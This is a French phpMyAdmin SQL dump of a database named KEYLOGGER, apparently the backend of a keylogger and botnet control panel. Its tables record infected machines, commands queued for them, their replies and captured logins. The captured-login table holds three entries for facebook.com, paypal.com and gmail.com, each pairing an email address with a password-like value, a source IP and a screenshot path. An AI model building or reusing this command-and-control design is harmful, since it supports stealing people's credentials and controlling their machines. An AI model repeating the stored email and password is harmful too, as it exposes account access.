-- phpMyAdmin SQL Dump
-- version 4.4.1.1
-- http://www.phpmyadmin.net
--
-- Client :  localhost:3306
-- Généré le :  Mer 15 Juin 2016 à 13:16
-- Version du serveur :  5.5.42
-- Version de PHP :  5.6.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

--
-- Base de données :  `KEYLOGGER`
--
CREATE DATABASE IF NOT EXISTS `KEYLOGGER` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `KEYLOGGER`;

-- --------------------------------------------------------

--
-- Structure de la table `bots`
--

DROP TABLE IF EXISTS `bots`;
CREATE TABLE `bots` (
  `id` int(10) NOT NULL,
  `serialnumber` varchar(40) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;

--
-- Vider la table avant d'insérer `bots`
--

TRUNCATE TABLE `bots`;
--
-- Contenu de la table `bots`
--

INSERT INTO `bots` (`id`, `serialnumber`) VALUES
(1, '1233v'),
(2, '1233v'),
(3, '23322fvdfd'),
(4, 'ewewwe$#'),
(5, '23322fvdfd'),
(6, 'ewewwe$#'),
(8, 'wewew$%##'),
(10, 'wewew$%##');

-- --------------------------------------------------------

--
-- Structure de la table `commands`
--

DROP TABLE IF EXISTS `commands`;
CREATE TABLE `commands` (
  `ID` int(11) NOT NULL,
  `destination` varchar(40) NOT NULL,
  `command` varchar(40) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Vider la table avant d'insérer `commands`
--

TRUNCATE TABLE `commands`;
-- --------------------------------------------------------

--
-- Structure de la table `Rapports`
--

DROP TABLE IF EXISTS `Rapports`;
CREATE TABLE `Rapports` (
  `iden` int(10) NOT NULL,
  `serialnum` varchar(40) NOT NULL,
  `time` tinytext,
  `fromuser` text NOT NULL,
  `website` text NOT NULL,
  `firstfield` text NOT NULL,
  `secondfield` text NOT NULL,
  `thirdfield` text NOT NULL,
  `image` varchar(120) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=22 DEFAULT CHARSET=latin1;

--
-- Vider la table avant d'insérer `Rapports`
--

TRUNCATE TABLE `Rapports`;
--
-- Contenu de la table `Rapports`
--

INSERT INTO `Rapports` (`iden`, `serialnum`, `time`, `fromuser`, `website`, `firstfield`, `secondfield`, `thirdfield`, `image`) VALUES
(19, 'Parallels-A8', 'Wed Jun 15 09:36:07 +0000 2016', '196.200.146.3', 'facebook.com', 'bdsasteamsec2017@gmail.com', 'bdsas2017', '', './images/Ck-3e24VEAAIG0z.jpg'),
(20, 'Parallels-A8', 'Wed Jun 15 09:35:59 +0000 2016', '196.200.146.3', 'paypal.com', 'bdsasteamsec2017@gmail.com', 'bdsas2017', '', './images/Ck-3dAjUYAAdBuG.jpg'),
(21, 'Parallels-A8', 'Wed Jun 15 09:34:51 +0000 2016', '196.200.146.3', 'gmail.com', 'bdsasteamsec2017@gmail.com', 'bdsas2017', '', './images/Ck-3MY7XEAAuSFc.jpg');

-- --------------------------------------------------------

--
-- Structure de la table `reponses`
--

DROP TABLE IF EXISTS `reponses`;
CREATE TABLE `reponses` (
  `id` int(11) NOT NULL,
  `command` varchar(50) NOT NULL,
  `reponce` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Vider la table avant d'insérer `reponses`
--

TRUNCATE TABLE `reponses`;
--
-- Index pour les tables exportées
--

--
-- Index pour la table `bots`
--
ALTER TABLE `bots`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`ID`);

--
-- Index pour la table `Rapports`
--
ALTER TABLE `Rapports`
  ADD PRIMARY KEY (`iden`);

--
-- Index pour la table `reponses`
--
ALTER TABLE `reponses`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pour les tables exportées
--

--
-- AUTO_INCREMENT pour la table `bots`
--
ALTER TABLE `bots`
  MODIFY `id` int(10) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=11;
--
-- AUTO_INCREMENT pour la table `Rapports`
--
ALTER TABLE `Rapports`
  MODIFY `iden` int(10) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=22; 